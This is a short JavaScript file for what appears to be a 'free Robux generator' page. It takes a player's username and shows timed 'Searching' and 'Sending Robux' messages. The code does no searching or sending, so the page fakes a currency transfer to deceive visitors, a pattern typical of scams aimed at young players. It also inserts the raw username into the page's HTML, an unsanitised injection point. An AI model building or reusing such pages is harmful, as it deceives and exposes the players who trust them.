const rbxbtn = document.querySelector(".getrbx");

const box1 = document.querySelector(".box");
const box2 = document.querySelector(".box2");
const box3 = document.querySelector(".box3");
const box4 = document.querySelector(".box4");
const rbxtotal = document.querySelectorAll(".details");

const username = document.querySelector(".username");

const useroutput = document.querySelector(".useroutput");

rbxbtn.addEventListener("click", () => {
  if (username.value.length <= 2) {
    alert("please enter username");
  } else {
    box1.style.display = "none";
    box2.style.display = "block";
    setTimeout(showbox2, 2500);
    setTimeout(showbox3, 2500);
  }

  useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
});

rbxtotal.forEach((btn) => {
  btn.addEventListener("click", () => {
    box3.style.display = "none";

    box2.style.display = "block";

    setTimeout(showboxagain, 2500);
    setTimeout(showbox4, 2500);
    useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
  });
});

let showboxagain = () => {
  box2.style.display = "none";
};
let showbox2 = () => {
  box2.style.display = "none";
};

let showbox3 = () => {
  box3.style.display = "block";
};

let showbox4 = () => {
  box4.style.display = "block";
};
